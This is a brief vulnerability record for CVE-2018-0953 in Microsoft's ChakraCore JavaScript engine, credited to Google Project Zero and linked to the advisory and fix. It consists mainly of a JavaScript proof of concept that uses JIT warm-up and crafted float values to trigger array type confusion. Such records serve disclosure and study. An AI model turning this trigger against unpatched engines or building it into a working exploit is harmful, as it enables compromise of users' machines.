# CVE-2018-0953

- Fix: May 2018
- Credit: lokihardt of Google Project Zero

## PoC

```javascript
function opt(arr, value) {
    arr[1] = value;
    arr[0] = 2.3023e-320;
}

function main() {
    for (let i = 0; i < 0x10000; i++)
        opt([1.1], 2.2);

    let arr = [1.1];
    opt(arr, -5.3049894784e-314);  // MAGIC VALUE!

    print(arr);
}

main();
```

## Reference

- [Microsoft](https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-0953)
- [Google Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1531)
- [Fix](https://github.com/Microsoft/ChakraCore/commit/71d7b389a8e01f1f29bff7202270f5ce1d63696a)
